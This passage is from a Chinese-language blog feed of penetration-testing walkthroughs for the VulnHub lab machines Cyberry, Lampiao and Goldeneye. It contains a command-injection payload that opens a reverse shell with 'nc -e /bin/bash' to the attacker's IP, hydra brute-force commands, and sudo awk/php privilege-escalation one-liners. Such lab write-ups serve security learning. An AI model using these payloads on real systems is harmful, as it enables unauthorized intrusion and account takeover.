        <content type="html"><![CDATA[<h1 id="cyberry">Cyberry</h1><h2 id="介绍">介绍</h2><p>相关资料都在:<a href="https://www.vulnhub.com/entry/cyberry-1,217/" title="https://www.vulnhub.com/entry/cyberry-1,217/">https://www.vulnhub.com/entry/cyberry-1,217/</a> 安全客原文:<a href="https://www.anquanke.com/post/id/154504" title="https://www.anquanke.com/post/id/154504">https://www.anquanke.com/post/id/154504</a> 首先过去下个镜像然后导进虚拟机就ok</p><h2 id="初步信息收集">初步信息收集</h2><p>扫一下ip <img src="/images/2018/09/2018-09-15-12-55-43屏幕截图.png" alt="blacsheep" /> 得到靶机ip:192.168.1.100 然后扫一下端口 <img src="/images/2018/09/2018-09-15-13-00-27屏幕截图.png" alt="blacsheep" /> 去80端口看一下 源码里面有一些base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- bmljZSB0cnkh --&gt;</span><br><span class="line">&lt;!-- bm90aGluZyB0byBzZWUgaGVyZSE= --&gt;</span><br><span class="line">&lt;!-- dGltZSB0byBtb3ZlIG9uIQ== -&gt;</span><br><span class="line">&lt;!-- c2VjcmV0ZmlsZS5odG1s -&gt;</span><br><span class="line">&lt;!-- d29yay1pbi1wcm9ncmVzcy5wbmc= --&gt;</span><br></pre></td></tr></table></figure><p>最后一个图片是 work-in-progress.png,不过似乎并不是图片,那么我们curl一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ curl http://192.168.1.100/work-in-progress.png</span><br><span class="line">edocrq</span><br></pre></td></tr></table></figure><p>去edocrq看下 <img src="/images/2018/09/2018-09-15-13-07-15屏幕截图.png" alt="blacsheep" /> 发现二维码,扫一下,然后找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/berrypedia.html#</span><br></pre></td></tr></table></figure><p>不过还是没什么东西 扫一下目录 <img src="/images/2018/09/2018-09-15-13-13-46屏幕截图.png" alt="blacsheep" /> 然后有个phpmyadmin,尝试一个root/root,失败了,打算从其他端口下手,然后ftp看能不能匿名登录,发现不能,666端口nc一下也并不能连接,然后发现其实是close的 做到这里就并不会了</p><h2 id="knock开端口">knock开端口</h2><p>看了下wp,发现这里是个脑洞... <code>http://192.168.1.100/berrypedia.html#</code>的<code>http://192.168.1.100/placeho1der.jpg</code>页面的图片里面藏了东西.. 首先翻转一下,然后调整一下 <img src="/images/2018/09/t01e3adfe1bf193f9b4.png" alt="blacsheep" /> 给个安全客上面的分析</p><blockquote><p>这里就很有意思了，有四个人，最上方还有一部分，出现了PORT字样，一时半会有些蒙蔽，但是显然这个靶机入口就在这里了(总不会无缘无故给一张这样的图吧- -)。然后，我分别把这四个人截图下来，用浏览器的识别功能去查了这四个人，了解了一下各个人的信息，这四个人分别是Smiley Lewis, Dave Edmunds, Fats Domino和Gale Storm，首先，他们都是艺术家，都演奏了同一首歌曲，名字叫，”I hear you knocking”，年份分别是，1970，1955，1955，1961，这差不多是共同点了，还是很蒙蔽0.0，这里结合了知识面和脑洞。。原来跟knock有关，linux下有个命令knock可供安装使用，端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机，知道这个就明白上面那个PORT的意思了，显然是有某个端口没有被打开，需要我们knock开。那年份就要用上了，从左上依次到右下knock 192.168.107.132 1970 1955 1955 1961。knock之后，再来扫描端口，从1-65535</p></blockquote><p><img src="/images/2018/09/2018-09-15-13-28-36屏幕截图.png" alt="blacsheep" /> emmm..试了一下,发现新开了端口 <img src="/images/2018/09/2018-09-15-13-28-24屏幕截图.png" alt="blacsheep" /> 去<a href="http://192.168.1.100:61955/" title="http://192.168.1.100:61955/">http://192.168.1.100:61955/</a>看下 再去扫一下目录,发现多了一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ http://192.168.1.100:61955/H (CODE:200SIZE:768)  </span><br></pre></td></tr></table></figure><p>上去看下,发现是个brainfuck的页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</span><br><span class="line">///////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.----.++++++++++++.[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;.--------.++++++++.-----------.+++.+++++++++++++.+.</span><br><span class="line"></span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.[---&gt;+&lt;]&gt;---.+[-&gt;+++&lt;]&gt;+.++++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;+.-------.+++++++++++..-------.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;.-----.------.++++++++.</span><br><span class="line"></span><br><span class="line">--------[--&gt;+++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;-.------------.--[---&gt;+&lt;]&gt;---.+++++++.</span><br><span class="line"></span><br><span class="line">+[-----&gt;+++&lt;]&gt;++++.------.+++++++++++++..+++++++.</span><br><span class="line"></span><br><span class="line">+[-------&gt;++&lt;]&gt;++.+++++++.-[--&gt;+&lt;]&gt;-.[--&gt;+&lt;]&gt;+++.[-&gt;+++&lt;]&gt;++.-.++++++++++.------.++++++++++.---------..</span><br></pre></td></tr></table></figure><p>解密一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line"></span><br><span class="line">team members</span><br><span class="line">chuck</span><br><span class="line">halle</span><br><span class="line">nick</span><br><span class="line">terry</span><br><span class="line">mary</span><br><span class="line">kerry</span><br><span class="line">pw: bakeoff</span><br></pre></td></tr></table></figure><p>好的,到这里那应该就是去爆密码了</p><h2 id="连ftp">连ftp</h2><p><img src="/images/2018/09/2018-09-15-13-42-22屏幕截图.png" alt="blacsheep" /> 然后ssh连不上去,但是可以连ftp <img src="/images/2018/09/2018-09-15-14-24-41屏幕截图.png" alt="blacsheep" /> 连上去之后有个.bash_history目录,进去之后发现有两个隐藏文件,get下来,查看一下 <img src="/images/2018/09/2018-09-15-14-27-55屏幕截图.png" alt="blacsheep" /> 一个是openssl的加密文件,一个是密码文件,那么我们用命令来解一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `openssl enc -ciphers  tail -n +2` ; do for j in `cat .trash`; do openssl $&#123;i:1&#125; -d -salt -md md5 -in .reminder.enc -out &quot;decrypted$i$j&quot; -k $j; done;done 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>这个会解密出很多文件,我们要去找明文,所以我们找ascii text的明文 <img src="/images/2018/09/2018-09-15-14-34-50屏幕截图.png" alt="blacsheep" /> 得到密码dangleberry69</p><h2 id="web的命令执行">web的命令执行</h2><p>回到login.php,帐号mary,密码dangleberry69登录一下 <img src="/images/2018/09/2018-09-15-14-37-15屏幕截图.png" alt="blacsheep" /> 看到下面的那个,是个dns解析,我们试试看命令执行 <img src="/images/2018/09/2018-09-15-14-40-32屏幕截图.png" alt="blacsheep" /> payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=blog.blacsheep.cn;nc -e /bin/bash 192.168.1.105 6712</span><br></pre></td></tr></table></figure><p>拿到shell <img src="/images/2018/09/2018-09-15-14-42-45屏幕截图.png" alt="blacsheep" /> 然后写一个shell进去,方便传文件提权 <img src="/images/2018/09/2018-09-15-14-44-34屏幕截图.png" alt="blacsheep" /></p><h2 id="提权">提权</h2><p>看下内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@cyberry:/tmp$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux cyberry 3.16.0-4-686-pae #1 SMP Debian 3.16.43-2+deb8u5 (2017-09-19) i686 GNU/Linux</span><br></pre></td></tr></table></figure><p>去searchsploit看下 <img src="/images/2018/09/2018-09-15-14-52-33屏幕截图.png" alt="blacsheep" /> 试了一下这个exp,失败了,开始找新的思路 文件目录有个nb-latin文件,看样子里面是密码 <img src="/images/2018/09/2018-09-15-15-11-38屏幕截图.png" alt="blacsheep" /> 把这个写到pass.dic再用hydra爆一下 <img src="/images/2018/09/2018-09-15-15-10-29屏幕截图.png" alt="blacsheep" /> ssh连一下,发现可以连上去 <img src="/images/2018/09/2018-09-15-15-14-10屏幕截图.png" alt="blacsheep" /> 然后<code>sudo -l</code>看下 <img src="/images/2018/09/2018-09-15-15-26-16屏幕截图.png" alt="blacsheep" /> 我们只能用terry的身份运行invoke.sh,那么试一下 <img src="/images/2018/09/2018-09-15-15-29-49屏幕截图.png" alt="blacsheep" /> 发现会去打开文件,那么我们让他去开/bin/bash,发现拿到了terry的权限 <img src="/images/2018/09/2018-09-15-15-30-55屏幕截图.png" alt="blacsheep" /> <code>sudo -l</code>一下看能执行什么 <img src="/images/2018/09/2018-09-15-15-31-45屏幕截图.png" alt="blacsheep" /> 发现可以执行awk,我们google看下awk如何执行命令 参考:<a href="https://blog.csdn.net/imzoer/article/details/8742603" title="https://blog.csdn.net/imzoer/article/details/8742603">https://blog.csdn.net/imzoer/article/details/8742603</a> 然后payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">terry@cyberry:/home/nick$ sudo -u halle awk &#x27;&#123;cmd=&quot;/bin/bash&quot;;system(cmd)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">halle@cyberry:/home/nick$ </span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-15-15-36-58屏幕截图.png" alt="blacsheep" /> 然后再<code>sodo -l</code>,得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:/home/nick$ sudo -l</span><br><span class="line">Matching Defaults entries for halle on cyberry:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User halle may run the following commands on cyberry:</span><br><span class="line">    (chuck) SETENV: NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>那么用chuck执行php的shell就好 <img src="/images/2018/09/2018-09-15-15-42-29屏幕截图.png" alt="blacsheep" /> 不过一旦连上去很快就断了... 不过没关系..我们system里面写代码一样相当与chuck的权限,然后读到sshkey <img src="/images/2018/09/2018-09-15-16-12-37屏幕截图.png" alt="blacsheep" /> 然后去密钥登录,但是失败了.. 再去看下前面的delete文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">halle@cyberry:~$ echo &quot;&lt;?php var_dump(system(&#x27;cat /home/chuck/.deleted/deleted&#x27;));?&gt;&quot;&gt;1.php</span><br><span class="line">halle@cyberry:~$ sudo -u chuck php 1.php</span><br><span class="line">From:       Berry, Chuck (chuckberry@cyberry)</span><br><span class="line">Sent:       Wednesday, November 22, 2017 2:52pm</span><br><span class="line">To:     Nick, Chuck (nickberry@cyberry)</span><br><span class="line">Subject:    Re: Christmas Meal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thanks Nick, that might just help me out!</span><br><span class="line"></span><br><span class="line">He did give me a few minor clues...</span><br><span class="line"></span><br><span class="line">The password starts with &quot;che&quot; and ends with &quot;rry&quot;</span><br><span class="line"></span><br><span class="line">letter e is used three times</span><br><span class="line">letter c is used twice</span><br><span class="line">letter r is used twice</span><br><span class="line">letter b is used twice</span><br><span class="line">letter a is used twice</span><br><span class="line"></span><br><span class="line">The only other letters in the password were h,w,m &amp; y</span><br><span class="line"></span><br><span class="line">I think I&#x27;ll probably have to write a little script to bruteforce SSH</span><br><span class="line">with what I already know. If I get it done before close of business </span><br><span class="line">I&#x27;ll get onto sorting out the Christmas meal. Promise!</span><br><span class="line"></span><br><span class="line">Thanks again</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Ah ok buddy. I don&#x27;t know if it helps you in any way</span><br><span class="line">but I saw the password jotted down on a post-it note in his office</span><br><span class="line">the other day! I can&#x27;t recall it exactly but I do remember it being</span><br><span class="line">a concatenated 4-word password....You know like &quot;eatberriesandsmile&quot;</span><br><span class="line"></span><br><span class="line">It wasn&#x27;t that, but it was something like that.... in fact I&#x27;m pretty</span><br><span class="line">sure one of those four words was actually latin... Now that I&#x27;m thinking</span><br><span class="line">about it I&#x27;m pretty sure it was &quot;baca&quot;.... well 99% sure. </span><br><span class="line">I&#x27;ve been studying latin for a few months now, so it kinda </span><br><span class="line">stuck in the memory</span><br><span class="line"></span><br><span class="line">Please don&#x27;t tell anyone I told you this b.t.w! :-)</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Nick,</span><br><span class="line"></span><br><span class="line">sorry buddy I didn&#x27;t get a chance to. The boss wants me to prove SSH</span><br><span class="line">access to root is secure, so I&#x27;m working on a few different things</span><br><span class="line">at the moment.</span><br><span class="line"></span><br><span class="line">Not having much luck to be honest!</span><br><span class="line"></span><br><span class="line">Chuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Chuck, </span><br><span class="line"></span><br><span class="line">Did you manage to book the venue for the Christmas meal?</span><br><span class="line"></span><br><span class="line">Time&#x27;s ticking by, and I think we need to send out an email</span><br><span class="line">to confirm numbers or else people might not be able to come.</span><br><span class="line"></span><br><span class="line">If you want, I can give them a ring later today?</span><br><span class="line"></span><br><span class="line">Either way, let me know.</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line"></span><br><span class="line">Nick</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string(0) &quot;&quot;</span><br><span class="line">halle@cyberry:~$ </span><br></pre></td></tr></table></figure><p>用crunch去生成密码,然后用hydra去爆 <img src="/images/2018/09/2018-09-15-19-02-16屏幕截图.png" alt="blacsheep" /> ssh连上去,发现是root <img src="/images/2018/09/2018-09-15-19-05-06屏幕截图.png" alt="blacsheep" /></p><h2 id="后续">后续</h2><p>后来发现还有一个提权方法,terry用户可以执行nick目录下面的makeberry二进制文件,而这里有一个栈溢出,可以交给二进制手子来做..</p><h1 id="lampiao">lampiao</h1><p>非常简单..</p><h2 id="介绍-1">介绍</h2><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/" title="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><h2 id="找ip扫端口">找ip,扫端口</h2><p>靶机ip:192.168.31.113 <img src="/images/2018/09/2018-09-16-01-48-59屏幕截图.png" alt="blacsheep" /></p><h2 id="拿shell">拿shell</h2><p>去1898看下,发现是drupal <img src="/images/2018/09/2018-09-16-01-56-41屏幕截图.png" alt="blacsheep" /> 直接用drupal的exp打一下 <img src="/images/2018/09/2018-09-16-01-50-39屏幕截图.png" alt="blacsheep" /> 然后拿到shell <img src="/images/2018/09/2018-09-16-01-51-28屏幕截图.png" alt="blacsheep" /></p><h2 id="提权-1">提权</h2><p>用一下探测脚本,然后这里选择脏牛 <img src="/images/2018/09/2018-09-16-01-55-42屏幕截图.png" alt="blacsheep" /> 写一个webshell然后传exp上去,执行一下 <img src="/images/2018/09/2018-09-16-02-08-53屏幕截图.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透学习(Goldeneye)</title>
      <link href="/2018/09/14/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0goldeneye/"/>
      <url>/2018/09/14/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0goldeneye/</url>
      
        <content type="html"><![CDATA[<p>参考:<a href="https://www.anquanke.com/post/id/156098#h3-4" title="https://www.anquanke.com/post/id/156098#h3-4">https://www.anquanke.com/post/id/156098#h3-4</a></p><h2 id="下载">下载</h2><p>Goldeneye靶机下载:<a href="https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ" title="https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ">https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ</a></p><h2 id="安装及探测">安装及探测</h2><p>vmbox直接导入,然后ip用<code>netdiscover</code> <img src="/images/2018/09/2018-09-13-23-48-47屏幕截图.png" alt="blacsheep" /> 靶机ip:192.168.31.147 扫一下端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~$ nmap -sV -Pn -v -p- -T5 192.168.31.147</span><br></pre></td></tr></table></figure><p>然后拿到结果 <img src="/images/2018/09/2018-09-13-23-51-59屏幕截图.png" alt="blacsheep" /></p><h2 id="端口">80端口</h2><p>去看下80端口 <img src="/images/2018/09/2018-09-13-23-53-34屏幕截图.png" alt="blacsheep" /> 看下源码,发现terminal.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unicode转一下,得到InvincibleHack3r <img src="/images/2018/09/2018-09-13-23-56-50屏幕截图.png" alt="blacsheep" /> 然后且到/sev-home,发现登录,那么直接帐号用boris,密码InvincibleHack3r,成功登录 看下源码,然后第一段重要源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;/video&gt;</span><br><span class="line">&lt;div id=&quot;golden&quot;&gt;</span><br><span class="line">&lt;h1&gt;GoldenEye&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) &lt;/p&gt;</span><br><span class="line">&lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;b&gt;GoldenEye Operators Training&lt;/b&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Remember, since &lt;b&gt;&lt;i&gt;security by obscurity&lt;/i&gt;&lt;/b&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>发现<code>we have configured our pop3 service to run on a very high non-default port</code> 然后扫端口的时候也知道pop3是55007 然后页面最下面还有一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Qualified GoldenEye Network Operator Supervisors: </span><br><span class="line">Natalya</span><br><span class="line">Boris</span><br></pre></td></tr></table></figure><p>那么我们转过来看pop3</p><h2 id="pop3">pop3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l Natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.31.147 -s 55007 pop3</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-14-00-07-33屏幕截图.png" alt="blacsheep" /> 以及</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.31.147 -s 55007 pop3</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-14-00-11-25屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login: boris   password: secret1!</span><br><span class="line">login: Natalya   password: bird</span><br></pre></td></tr></table></figure><p>这里可以nc直接连试一下 <img src="/images/2018/09/2018-09-14-00-22-28屏幕截图.png" alt="blacsheep" /> 三封邮件,等上去看下 如果嫌麻烦可以用thunderbird <img src="/images/2018/09/2018-09-14-00-25-37屏幕截图.png" alt="blacsheep" /> 关键邮件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle </span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure><p>我们去改一下hosts <img src="/images/2018/09/2018-09-14-00-28-37屏幕截图.png" alt="blacsheep" /> 然后连一下,用前面的帐号密码登录,找到一封邮件 <img src="/images/2018/09/2018-09-14-00-33-24屏幕截图.png" alt="blacsheep" /> 然后hydra爆一下 <img src="/images/2018/09/2018-09-14-00-37-30屏幕截图.png" alt="blacsheep" /> pop3连一下 <img src="/images/2018/09/2018-09-14-00-38-46屏幕截图.png" alt="blacsheep" /> 拿到网站的帐号密码,换帐号,发现一个secret文件 <img src="/images/2018/09/2018-09-14-00-40-36屏幕截图.png" alt="blacsheep" /> 里面写着</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 